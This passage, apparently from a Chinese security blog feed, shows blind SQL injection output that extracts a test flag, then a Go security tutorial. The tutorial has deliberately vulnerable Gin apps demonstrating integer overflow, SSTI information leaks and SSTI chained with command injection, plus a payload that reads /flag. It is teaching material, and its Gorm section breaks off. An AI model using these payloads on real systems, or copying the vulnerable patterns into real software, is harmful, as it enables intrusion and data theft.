1 个字符猜解成功： f第 2 个字符猜解成功： fl第 3 个字符猜解成功： fla第 4 个字符猜解成功： flag-----------------获取字段名长度-----------------正在测试长度： 1正在测试长度： 2正在测试长度： 3测试长度完成，长度为： 4-----------------获取字段名-----------------第 1 个字符猜解成功： f第 2 个字符猜解成功： fl第 3 个字符猜解成功： fla第 4 个字符猜解成功： flag-----------------获取字段值长度-----------------正在测试长度： 1正在测试长度： 2正在测试长度： 3正在测试长度： 4正在测试长度： 5正在测试长度： 6正在测试长度： 7正在测试长度： 8正在测试长度： 9正在测试长度： 10正在测试长度： 11正在测试长度： 12正在测试长度： 13正在测试长度： 14测试长度完成，长度为： 15-----------------获取字段值-----------------第 1 个字符猜解成功： f第 2 个字符猜解成功： fl第 3 个字符猜解成功： fla第 4 个字符猜解成功： flag第 5 个字符猜解成功： flag&#123;第 6 个字符猜解成功： flag&#123;t第 7 个字符猜解成功： flag&#123;te第 8 个字符猜解成功： flag&#123;tes第 9 个字符猜解成功： flag&#123;test第 10 个字符猜解成功： flag&#123;test_第 11 个字符猜解成功： flag&#123;test_f第 12 个字符猜解成功： flag&#123;test_fl第 13 个字符猜解成功： flag&#123;test_fla第 14 个字符猜解成功： flag&#123;test_flag第 15 个字符猜解成功： flag&#123;test_flag&#125;</code></pre><p>同时，由于获取了任意 SQL 语句执行的权限，该漏洞可配合其他常用 MySQL 漏洞实现拒绝服务攻击、任意代码执行、权限提升等目的</p>]]></content>
      
      
      <categories>
          
          <category> Skill </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 安全问题</title>
      <link href="/skill/go-%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"/>
      <url>/skill/go-%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="1-整数溢出漏洞"><a href="#1-整数溢出漏洞" class="headerlink" title="1. 整数溢出漏洞"></a>1. 整数溢出漏洞</h2><p>Go 语⾔是强类型语⾔, 包含多种数据类型</p><h3 id="Go-语言数据类型"><a href="#Go-语言数据类型" class="headerlink" title="Go 语言数据类型"></a>Go 语言数据类型</h3><p>在 Go 编程语言中，数据类型用于声明函数和变量。</p><p>数据类型的出现是为了把数据分成所需内存大小不同的数据，编程的时候需要用大数据的时候才需要申请大内存，就可以充分利用内存。</p><p>Go 语言按类别有以下几种数据类型：</p><table><thead><tr><th>序号</th><th>类型和描述</th></tr></thead><tbody><tr><td>1</td><td><strong>布尔型</strong>  <br>布尔型的值只可以是常量 true 或者 false。一个简单的例子：var b bool &#x3D; true。</td></tr><tr><td>2</td><td><strong>数字类型</strong>  <br>整型 int 和浮点型 float32、float64，Go 语言支持整型和浮点型数字，并且支持复数，其中位的运算采用补码。</td></tr><tr><td>3</td><td><strong>字符串类型:</strong>  <br>字符串就是一串固定长度的字符连接起来的字符序列。Go 的字符串是由单个字节连接起来的。Go 语言的字符串的字节使用 UTF-8 编码标识 Unicode 文本。</td></tr><tr><td>4</td><td><strong>派生类型:</strong>  <br>包括：<br><br>- (a) 指针类型（Pointer）<br>- (b) 数组类型<br>- (c) 结构化类型(struct)<br>- (d) Channel 类型<br>- (e) 函数类型<br>- (f) 切片类型<br>- (g) 接口类型（interface）<br>- (h) Map 类型</td></tr></tbody></table><hr><h4 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h4><p>Go 也有基于架构的类型，例如：int、uint 和 uintptr。</p><table><thead><tr><th>序号</th><th>类型和描述</th></tr></thead><tbody><tr><td>1</td><td><strong>uint8</strong>  <br>无符号 8 位整型 (0 到 255)</td></tr><tr><td>2</td><td><strong>uint16</strong>  <br>无符号 16 位整型 (0 到 65535)</td></tr><tr><td>3</td><td><strong>uint32</strong>  <br>无符号 32 位整型 (0 到 4294967295)</td></tr><tr><td>4</td><td><strong>uint64</strong>  <br>无符号 64 位整型 (0 到 18446744073709551615)</td></tr><tr><td>5</td><td><strong>int8</strong>  <br>有符号 8 位整型 (-128 到 127)</td></tr><tr><td>6</td><td><strong>int16</strong>  <br>有符号 16 位整型 (-32768 到 32767)</td></tr><tr><td>7</td><td><strong>int32</strong>  <br>有符号 32 位整型 (-2147483648 到 2147483647)</td></tr><tr><td>8</td><td><strong>int64</strong>  <br>有符号 64 位整型 (-9223372036854775808 到 9223372036854775807)</td></tr></tbody></table><h4 id="浮点型"><a href="#浮点型" class="headerlink" title="浮点型"></a>浮点型</h4><table><thead><tr><th>序号</th><th>类型和描述</th></tr></thead><tbody><tr><td>1</td><td><strong>float32</strong>  <br>IEEE-754 32位浮点型数</td></tr><tr><td>2</td><td><strong>float64</strong>  <br>IEEE-754 64位浮点型数</td></tr><tr><td>3</td><td><strong>complex64</strong>  <br>32 位实数和虚数</td></tr><tr><td>4</td><td><strong>complex128</strong>  <br>64 位实数和虚数</td></tr></tbody></table><hr><h4 id="其他数字类型"><a href="#其他数字类型" class="headerlink" title="其他数字类型"></a>其他数字类型</h4><p>以下列出了其他更多的数字类型：</p><table><thead><tr><th>序号</th><th>类型和描述</th></tr></thead><tbody><tr><td>1</td><td><strong>byte</strong>  <br>类似 uint8</td></tr><tr><td>2</td><td><strong>rune</strong>  <br>类似 int32</td></tr><tr><td>3</td><td><strong>uint</strong>  <br>32 或 64 位</td></tr><tr><td>4</td><td><strong>int</strong>  <br>与 uint 一样大小</td></tr><tr><td>5</td><td><strong>uintptr</strong>  <br>无符号整型，用于存放一个指针</td></tr></tbody></table><p>以数字类型为例, 存在 <code>uint8</code> <code>uint16</code> <code>uint32</code> <code>uint64</code> (⽆符号整型) 和 <code>int8</code> <code>int16</code> <code>int32</code> <code>int64</code> (有符号整型) 等类型</p><p>Go 语⾔在编译期会检查源码中定义的变量是否存在溢出, 例如 <code>var i uint8 = 99999</code> 会使得编译不通过, 但并不会检查变量的运算过程中是否存在溢出, 例如 <code>var i uint8 = a * b</code></p><p>如果程序没有对变量的取值范围做限制, 那么在部分场景下就可能存在整数溢出漏洞</p><p>eg. </p><pre class="language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"crypto/rand"</span>    <span class="token string">"fmt"</span>    <span class="token string">"os"</span>    <span class="token string">"strconv"</span>      <span class="token string">"github.com/gin-contrib/sessions"</span>    <span class="token string">"github.com/gin-contrib/sessions/cookie"</span>    <span class="token string">"github.com/gin-gonic/gin"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">IndexHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    s <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>    <span class="token keyword">if</span> s<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"money"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>        s<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"money"</span><span class="token punctuation">,</span> <span class="token function">int64</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        s<span class="token punctuation">.</span><span class="token function">Save</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    money <span class="token operator">:=</span> s<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"money"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">int64</span><span class="token punctuation">)</span>    c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>        <span class="token string">"money"</span><span class="token punctuation">:</span> money<span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">BuyHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    s <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>    money <span class="token operator">:=</span> s<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"money"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">int64</span><span class="token punctuation">)</span>    num <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">Query</span><span class="token punctuation">(</span><span class="token string">"num"</span><span class="token punctuation">)</span>      <span class="token comment">// apple price</span>    price <span class="token operator">:=</span> <span class="token function">int64</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    n<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> strconv<span class="token punctuation">.</span><span class="token function">Atoi</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>    total <span class="token operator">:=</span> price <span class="token operator">*</span> <span class="token function">int64</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>    <span class="token keyword">if</span> n <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>            <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"num can't be negative"</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> money <span class="token operator">>=</span> total <span class="token punctuation">&#123;</span>        money <span class="token operator">-=</span> total        s<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"money"</span><span class="token punctuation">,</span> money<span class="token punctuation">)</span>        s<span class="token punctuation">.</span><span class="token function">Save</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>            <span class="token string">"message"</span><span class="token punctuation">:</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"buy %v apple success"</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>            <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"you don't have enough money"</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">FlagHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    s <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>    money <span class="token operator">:=</span> s<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"money"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">int64</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> money <span class="token operator">></span> <span class="token number">100000000</span> <span class="token punctuation">&#123;</span>        flag<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">)</span>        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>            <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"here is your flag"</span><span class="token punctuation">,</span>            <span class="token string">"flag"</span><span class="token punctuation">:</span>    <span class="token function">string</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>            <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"you dont' have enough money"</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    secret <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    rand<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span>    r <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    store <span class="token operator">:=</span> cookie<span class="token punctuation">.</span><span class="token function">NewStore</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span>    r<span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span>sessions<span class="token punctuation">.</span><span class="token function">Sessions</span><span class="token punctuation">(</span><span class="token string">"gosession"</span><span class="token punctuation">,</span> store<span class="token punctuation">)</span><span class="token punctuation">)</span>        r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> IndexHandler<span class="token punctuation">)</span>    r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/buy"</span><span class="token punctuation">,</span> BuyHandler<span class="token punctuation">)</span>    r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> FlagHandler<span class="token punctuation">)</span>    r<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">":80"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre><p><code>/</code> 路由可以显示当前⽤户的 money</p><p><code>/buy</code> 路由则可以购买指定数量的商品 (apple)</p><p><code>/flag</code> 路由可以查看 flag, 但是当前的 money 必须⼤于等于 100000000</p><p>在 <code>/buy</code> 路由中, 虽然限制了 n 不能为负数, 但是并没有限制 n 的最⼤值, 因此我们可以<br>控制 n, 使得 <code>price * int64(n)</code> 溢出为⼀个负数, 之后进⾏ <code>money -= total</code>运算的时候, money 就会增加, 最终拿到 flag</p><p>查阅⽂档可以得知 Go int64 类型的范围为 <code>-9223372036854775808 ~ 9223372036854775807</code></p><p>已知初始 money 为 100 ，通过计算可以得到 num 的值为  922337205685477580 时会造成整数溢出，并且可以满足题目中要求的 money 的值</p><p>Proof of Work：</p><pre class="language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span>    <span class="token string">"strconv"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    money <span class="token operator">:=</span> <span class="token function">int64</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>    price <span class="token operator">:=</span> <span class="token function">int64</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    num<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> strconv<span class="token punctuation">.</span><span class="token function">Atoi</span><span class="token punctuation">(</span><span class="token string">"922337205685477580"</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>money <span class="token operator">-</span> price<span class="token operator">*</span><span class="token function">int64</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre><h2 id="2-Go-SSTI-模版注入"><a href="#2-Go-SSTI-模版注入" class="headerlink" title="2. Go SSTI 模版注入"></a>2. Go SSTI 模版注入</h2><h3 id="2-1-信息泄露"><a href="#2-1-信息泄露" class="headerlink" title="2.1 信息泄露"></a>2.1 信息泄露</h3><p>和 Python Jinja2 SSTI ⼀样, 在 Go 语⾔中也存在着 SSTI</p><p>Go 官⽅库中存在两个模版库: <code>text/template</code> 和 <code>html/template</code> , 区别在于后者<br>默认会将内容中的特殊字符进⾏ html 编码, 以防⽌ XSS 的发⽣, ⽽前者没有任何保<br>护措施</p><p>Go 语⾔中的 SSTI 的利⽤依赖于⽣成模版时传⼊的结构体对象, 根据对象类型的不<br>同, 可以造成信息泄露或调⽤其中的某些⽅法⽽造成 RCE</p><p>使⽤ {{ . }} 可以显示出传⼊的结构体的所有字段的值, 从⽽造成信息泄露</p><p>eg.</p><pre class="language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span>    <span class="token string">"html/template"</span>    <span class="token string">"os"</span>    <span class="token string">"github.com/gin-gonic/gin"</span><span class="token punctuation">)</span><span class="token keyword">type</span> User <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    Name  <span class="token builtin">string</span>    Email <span class="token builtin">string</span>    Flag  <span class="token builtin">string</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">IndexHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    flag<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">)</span>    user <span class="token operator">:=</span> <span class="token operator">&amp;</span>User<span class="token punctuation">&#123;</span>Name<span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span> Email<span class="token punctuation">:</span> <span class="token string">"admin@admin.com"</span><span class="token punctuation">,</span> Flag<span class="token punctuation">:</span> <span class="token function">string</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>    msg <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">DefaultQuery</span><span class="token punctuation">(</span><span class="token string">"msg"</span><span class="token punctuation">,</span> <span class="token string">"helloworld"</span><span class="token punctuation">)</span>    content <span class="token operator">:=</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"&lt;h1>Hello &#123;&#123; .Name&#125;&#125;&lt;/h1> &lt;p>Message: %s&lt;/p>"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span>    tmpl<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> template<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token string">"UserInfo"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>    c<span class="token punctuation">.</span><span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"text/html"</span><span class="token punctuation">)</span>    tmpl<span class="token punctuation">.</span><span class="token function">Execute</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>Writer<span class="token punctuation">,</span> user<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    r <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> IndexHandler<span class="token punctuation">)</span>    r<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">":80"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre><p>index 路由从 GET 参数中获取 msg 并直接拼接到 template 内, 后续⽣成模版内容的时候传⼊了 user 结构体, ⽽ user 结构体中存在 Flag 字段</p><p>使⽤ {{ . }} 可以显示出传⼊的结构体的所有字段的值, 从⽽造成信息泄露, 拿到flag</p><h3 id="2-2-命令执行"><a href="#2-2-命令执行" class="headerlink" title="2.2 命令执行"></a>2.2 命令执行</h3><p>如果在⽣成模版内容的时候, 传⼊的结构体对象中存在着⼀些可调⽤的⽅法, 那么可以通过 SSTI 来调⽤结构体中的部分⽅法, 实现 RCE</p><p>根据 Go 官⽅⽂档, 被调⽤的⽅法存在如下条件：</p><ul><li>存在⼀个返回值, 可以为任意类型</li><li>存在两个返回值, 且第⼀个为任意类型, 第⼆个为 error 类型</li></ul><p>eg.</p><pre class="language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span>    <span class="token string">"html/template"</span>    <span class="token string">"os/exec"</span>    <span class="token string">"github.com/gin-gonic/gin"</span><span class="token punctuation">)</span><span class="token keyword">type</span> User <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    Name  <span class="token builtin">string</span>    Email <span class="token builtin">string</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>u <span class="token operator">*</span>User<span class="token punctuation">)</span> <span class="token function">QueryProcess</span><span class="token punctuation">(</span>name <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> u<span class="token punctuation">.</span>Name <span class="token operator">!=</span> <span class="token string">"admin"</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"You are not admin"</span>    <span class="token punctuation">&#125;</span>    cmd <span class="token operator">:=</span> exec<span class="token punctuation">.</span><span class="token function">Command</span><span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"ps -ef | grep "</span><span class="token operator">+</span>name<span class="token punctuation">)</span>    output<span class="token punctuation">,</span> err <span class="token operator">:=</span> cmd<span class="token punctuation">.</span><span class="token function">CombinedOutput</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token function">string</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> users <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token operator">*</span>User<span class="token keyword">func</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    users <span class="token operator">=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token operator">*</span>User<span class="token punctuation">)</span>    users<span class="token punctuation">[</span><span class="token string">"admin"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>User<span class="token punctuation">&#123;</span>Name<span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span> Email<span class="token punctuation">:</span> <span class="token string">"admin@admin.com"</span><span class="token punctuation">&#125;</span>    users<span class="token punctuation">[</span><span class="token string">"test"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>User<span class="token punctuation">&#123;</span>Name<span class="token punctuation">:</span> <span class="token string">"test"</span><span class="token punctuation">,</span> Email<span class="token punctuation">:</span> <span class="token string">"test@test.com"</span><span class="token punctuation">&#125;</span>    users<span class="token punctuation">[</span><span class="token string">"guest"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>User<span class="token punctuation">&#123;</span>Name<span class="token punctuation">:</span> <span class="token string">"guest"</span><span class="token punctuation">,</span> Email<span class="token punctuation">:</span> <span class="token string">"guest@guest.com"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">IndexHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    name <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">DefaultQuery</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">,</span> <span class="token string">"guest"</span><span class="token punctuation">)</span>    content <span class="token operator">:=</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"&#123;&#123; $u := index .users \"%s\" &#125;&#125;&lt;h1>Hello &#123;&#123; $u.Name &#125;&#125;, Your Email is &#123;&#123; $u.Email &#125;&#125;&lt;/h1>"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>    tmpl<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> template<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token string">"UserInfo"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>    c<span class="token punctuation">.</span><span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"text/html"</span><span class="token punctuation">)</span>    tmpl<span class="token punctuation">.</span><span class="token function">Execute</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>Writer<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>        <span class="token string">"users"</span><span class="token punctuation">:</span> users<span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    r <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span><span class="token function">Any</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> IndexHandler<span class="token punctuation">)</span>    r<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">":80"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre><p>index 路由存在 SSTI, 并且传⼊了 users 结构体数组</p><p>同时 User 结构体存在 QueryProcess ⽅法, 该⽅法将传⼊的 name 直接拼接到 <code>ps -ef | grep</code> 后⾯, 存在命令注⼊</p><p>因此, 我们就可以利⽤ SSTI 来调⽤ User 结构体的 QueryProcess ⽅法, 配合命令注⼊, 实现 RCE</p><p>构造 payload：</p><pre class="language-none"><code class="language-none">&#x2F;?name&#x3D;admin%22&#125;&#125;&#123;&#123;+$u.QueryProcess%20%22|%20cat%20&#x2F;flag</code></pre><h2 id="3-Gorm-相关"><a href="#3-Gorm-相关" class="headerlink" title="3. Gorm 相关"></a>3. Gorm 相关</h2><p>GORM 是 Go 语⾔的⼀个 ORM 框架, 它将 Go 中的 struct 类型与 SQL 表中的数据进⾏映射, 相较于直接⼿写原⽣的 SQL 语句, GORM 的使⽤⽅式更加友好, 开发者也更容易上⼿</p><p>GORM 提供了 First, Take, Last 等⽅法以进⾏ SQL 查询, ⽽这些⽅法都⽀持主键检索</p><pre class="language-go" data-language="go"><code class="language-go">db<span class="token punctuation">.</span><span class="token function">First</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>user<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token comment">// SELECT * FROM users WHERE id = 10;</span>db<span class="token punctuation">.</span><span class="token function">First</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>user<span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">)</span><span class="token comment">// SELECT * FROM users WHERE id = 10;</span>db<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>users<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">// SELECT * FROM users WHERE id IN 